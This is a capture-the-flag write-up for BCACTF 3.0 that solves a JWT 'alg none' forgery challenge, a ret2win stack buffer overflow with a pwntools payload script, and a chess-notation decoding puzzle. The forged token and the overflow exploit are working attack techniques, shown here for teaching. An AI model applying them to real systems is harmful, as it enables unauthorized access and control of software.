# [BCACTF 3.0](https://www.bcactf.com/)<a name="bcactf-3"></a>

<img align="left" width="200" height="175" src="https://user-images.githubusercontent.com/68913871/173014195-611780c8-0734-45ae-941f-77214cf13ac8.png">

&nbsp; 72 hours Jeopardy-Style  
&nbsp; Sat, 04 June 2022, 08:00 SGT — Tue, 07 June 2022, 08:00 SGT  

&nbsp; **Team Name:** *Rookie441*  
&nbsp; **Team Member(s):**  
&nbsp; 1. *Lee Wen Bin Andre*  

<br/><br>

| Challenge | Category |
| --- | --- |
| [Jason Web Tarrot](#jason-web-tarrot)	| Web |
| [Jump Rope](#jump-rope)	| Pwn |
| [Chessy](#chessy) | Crypto |

## Jason Web Tarrot

![image](https://user-images.githubusercontent.com/68913871/173015114-747b9fb7-16b9-47f2-90fe-64562ee11143.png)

> After pulling a card, we can see under developer tools that the cookie `token` has a value `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc1N1YnNjcmliZXIiOmZhbHNlLCJpYXQiOjE2NTQzMDA1NzR9.` The format of this string which starts with `ey` and separated with `.` is an indicator that it is a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)

![image](https://user-images.githubusercontent.com/68913871/173015126-cbf333d0-1b2a-4d49-91c5-1199bb821a17.png)

> A JWT token is divided into 3 components: `Header`, `Payload` and `Signature`, encoded in base64.

![image](https://user-images.githubusercontent.com/68913871/173023191-15830359-ba37-4ad5-949c-0d4373d623dd.png)
[Read more here](https://research.securitum.com/jwt-json-web-token-security/)

> We can use [jwt.io](https://jwt.io/) to decode the token

![image](https://user-images.githubusercontent.com/68913871/173022346-5567e342-a138-4072-b708-3889fd997b7b.png)

> We can see under `Header` that `"alg": "none"` meaning that there is no algorithm, which is indeed the case because the JWT token is missing the last component as seen by the empty string after the 2nd period `.`

> Also to note is that under `Payload`, `"isSubscriber"` is set to `false`. We have to change this to `true` in order to get our flag. We can use CyberChef for this, making sure we set our signing algorithm to None.

![image](https://user-images.githubusercontent.com/68913871/173024741-c762154c-04f4-41e1-814b-ab71f5dfb970.png)

> Edit the cookie value of `token` to the new JWT token `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc1N1YnNjcmliZXIiOnRydWUsImlhdCI6MTY1NDMwMDU3NH0.` and pull the card once more to get the flag.

![image](https://user-images.githubusercontent.com/68913871/173015141-78e80e9b-1a6e-4c40-ae39-bdf531dd2a30.png)

`bcactf{n0_s3cr3t5????!!!?!_38893}`

## Jump Rope

![image](https://user-images.githubusercontent.com/68913871/173026529-86a90d33-dd9e-4d2a-99a8-a8176fb788b4.png)

> This is a typical `ret2win` challenge where we need to control the `RIP`. The following is the code provided

```C
#include <stdio.h>
#include <stdlib.h>

void a() {
    FILE *fptr = fopen("flag.txt", "r");
    char flag[100];
    if(fptr == NULL){
        printf("\nLooks like we've run out of jump ropes...\n");
        printf("Challenge is misconfigured. Please contact admin if you see this.\n");
    }

    fgets(flag, sizeof(flag), fptr);
    puts(flag);
}

void jumprope(){
    char arr[500];
    printf("\nBetter start jumping!\n");
    gets(arr);
    printf("Woo, that was quite the workout wasn't it!\n");
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    printf("Here at BCA, fitness is one of our biggest priorities!\n");
    printf("Today's workout is going to be jumproping. Enjoy!\n");
    jumprope();

    return 1;
}
```

> First, we analyze the binary using `file` and `checksec` commands.

![image](https://user-images.githubusercontent.com/68913871/173027496-08cdb8d7-cb8f-4ed0-9c7a-383daebe89ba.png)

> From the results, we can determine that this is a 64-bit system, and no PIE enabled. PIE (position independent executable) is a precondition to enable address space layout randomization (ASLR), which is a security feature where the kernel loads the binary and dependencies into a random location of virtual memory each time it's run. [Read more](https://stackoverflow.com/questions/47778099/what-is-no-pie-used-for)

> From the C code, we can see that there is a vulnerable `gets()` function in `jumprope()`. Since it does not check for the size of user input, we can overflow the buffer here.

> The function `a()` prints out the flag. This is our win function that we need to return to by controlling the program's return address.

> Now, we can analyze the binary using a debugger. Here I used [gdb with peda extention](https://www.bitforestinfo.com/blog/01/09/how-to-install-gdb-peda.html)

> With gdb-peda, we can create a cyclic pattern using `pattern create`. Here, I used the value `600` because I know from the code that the stack contains `char arr[500]`, so I would want a bit more to analyze. Then, run the program using `run` or `r` and paste the pattern as the user input of the `gets()` function.

![image](https://user-images.githubusercontent.com/68913871/173034854-57670972-c7b2-4233-bc7a-39f3ccd3ad79.png)

> We get a segmentation fault because the program is trying to access memory locations that does not exist. gdb-peda also shows us the register and stack values which comes in handy in our analysis.

![image](https://user-images.githubusercontent.com/68913871/173035207-a28159e6-c56c-4494-9202-485e98ca9867.png)

> We can see that we have successfully overflowed the buffer into `RBP`(base pointer) and `RSP`(stack/frame pointer). Since we need to control the `RIP`(return instruction pointer) to return to function `a()`, we will need to overflow exactly after the `RSP`.

> We can calculate the offset easily using `pattern offset`

![image](https://user-images.githubusercontent.com/68913871/173036261-eba513ce-5dbd-404c-b917-139df7abeb73.png)

> We can see that the `RBP` has an offset of 512 and the `RSP` has an offset of 520. This is because as mentioned previously, this binary is a 64-bit architecture thus the size of the frame pointer is 8 bytes.

> Now that we have our offset of 520, we need to get the address of our win function `a()`. As mentioned earlier, PIE is not enabled, thus the address will remain the same in every execution. We can determine the hexadecimal address using `disassemble`

![image](https://user-images.githubusercontent.com/68913871/173037247-71841cc8-f039-46b4-8968-ead1a1cc09eb.png)

> We get the address of `a()` to be `0x4011b6`. We can then proceed to write a pwntools script to connect to the remote server and use `p64` to pack our hexadecimal address with the appropriate endianness to our payload.

```python
from pwn import *
conn = remote ('bin.bcactf.com', 49177)
offset = 520 #gdb-peda pattern offset of rsp
WINADDRESS = 0x4011b6 #address of a()
payload = b"A"*(offset) + p64(WINADDRESS) #overflow the buffer with many 'A' characters then override RIP with address of a()
conn.sendline(payload)
conn.interactive()
```

![image](https://user-images.githubusercontent.com/68913871/173026963-bf30997f-41d2-4bc5-b0f5-ff7e3870f1fe.png)

`bcactf{buff3r_0v3rfl0w_f4nct10n_j4mps_NfEgj4hg}`

## Chessy

![image](https://user-images.githubusercontent.com/68913871/173039197-d2585e5c-cbc3-4e72-aa6a-a6f674fd99c5.png)

> This is the contents of `FEN.txt`

```
2qp2kN/1qbpR1PN/1Bq2KQ1/1knR1r2/1Nq3Rb/1bn4n/1qr3nR/1BR3P1
1QP1PkR1/1PR2k1P/1KQk2NK/2rN1B1K/1KK4q/1nnr4/1R1PqRBQ/1qN1KBp1
1kB1Br1P/1bQ1p1Pk/1NB3Np/2rP2RQ/1bQ1Q3/1qK3PB/1r1Nbpkq/2RB1NkR
1np1B1b1/1QR4B/2Rk2q1/2pqq2p/1Q1pkbQK/2rn2rR/1KNk1p2/2bn1K2
1QpNrR1Q/1QB1K2n/1QNb1k1Q/2QKR2R/1np1PQ1b/1bP1br2/2rP2n1/2qR2pk
```

> From the challenge name and description, we know that this challenge has something to do with chess. In fact, FEN, or [Forsyth–Edwards Notation](https://en.wikipedia.org/wiki/Forsyth%E2%80%93Edwards_Notation) is a standard notation for describing a particular board position of a chess game.

> We can proceed to decode the first line using a [FEN decoder](https://www.dcode.fr/fen-chess-notation). The positions of the pieces is pretty strange. However, if we were to see them in terms of 1s and 0s (1=occupied, 0=unoccupied), we can craft the following binary (from bottom to up, rows 1-8):

```
01100010 01100011 01100001 01100011 01110100 01100110 01111011 00110011
```

> Decoding this gives us `bcactf{3` which is the correct flag format.

![image](https://user-images.githubusercontent.com/68913871/173040596-896e5c65-3323-4f7d-8464-0f5845032b22.PNG)

> We can then continue to decode the next FEN notation. However, we are met with an error.

![image](https://user-images.githubusercontent.com/68913871/173041988-07bb2f5d-d05d-4eae-9c2e-3ea3460d6458.PNG)

> In row 4, our binary will be `00000001`. However, is is not a printable [ASCII character](https://web.alfredstate.edu/faculty/weimandn/miscellaneous/ascii/ascii_index.html). Let's then look into how the FEN decoder works.

![image](https://user-images.githubusercontent.com/68913871/173042530-2dd82459-9c65-49ef-8c39-340d9ac69066.png)

> From the above table, we can note that row 4, which is `1KK4q` is supposed to be `01100001`. Thus, there is a slight problem with the online decoder. As a result, I was forced to create a python script for the decoding process.

> Since the result is read from bottom to top, I have to first reverse the order for every row. Then, for every non-integer translate to a "1" and every integer, to a multiple of "0"s

```python
flag = ""

def bin_to_ascii(bin_str):
    binary_values = bin_str.split()
    ascii_string = ""
    for binary_value in binary_values:
        an_integer = int(binary_value, 2)
        ascii_character = chr(an_integer)
        ascii_string += ascii_character
    return ascii_string

with open("FEN.txt", "r") as myFile:
    for line in myFile.readlines():
        # Remove newline character if present
        if line[-1] == '\n':
            original = line[:-1]
        else:
            original = line
        #split by / and reverse then join the list
        full_str = '/'.join(original.split("/")[::-1])
        print(full_str)
        partial_flag = ""
        for char in full_str:
            if char == "/":
                partial_flag+=" "
                continue
            # if able to do int() means it is a number, else it is an alphabet
            try:
               partial_flag+=("0" * int(char)) #indicates number of empty boxes
            except:
                partial_flag+="1" #indicates number of occupied boxes
        partial_flag+=" "
        flag+=partial_flag
    print()
    print(flag)
    print()
    print(bin_to_ascii(flag))

```

> The output is as follows:

```
1BR3P1/1qr3nR/1bn4n/1Nq3Rb/1knR1r2/1Bq2KQ1/1qbpR1PN/2qp2kN
1qN1KBp1/1R1PqRBQ/1nnr4/1KK4q/2rN1B1K/1KQk2NK/1PR2k1P/1QP1PkR1
2RB1NkR/1r1Nbpkq/1qK3PB/1bQ1Q3/2rP2RQ/1NB3Np/1bQ1p1Pk/1kB1Br1P
2bn1K2/1KNk1p2/2rn2rR/1Q1pkbQK/2pqq2p/2Rk2q1/1QR4B/1np1B1b1
2qR2pk/2rP2n1/1bP1br2/1np1PQ1b/2QKR2R/1QNb1k1Q/1QB1K2n/1QpNrR1Q

01100010 01100011 01100001 01100011 01110100 01100110 01111011 00110011 01101110 01011111 01110000 01100001 00110101 01110011 01100101 01101110 00110111 01011111 01100011 01101000 00110011 01100011 01101011 01101101 00110100 01110100 00110011 01011111 00111001 00110010 01100001 01101010 00110011 00110010 01101100 01101101 00111001 01110101 01101001 01111101 

bcactf{3n_pa5sen7_ch3ckm4t3_92aj32lm9ui}
```

`bcactf{3n_pa5sen7_ch3ckm4t3_92aj32lm9ui}`

## [Go to Top](#bcactf-3)
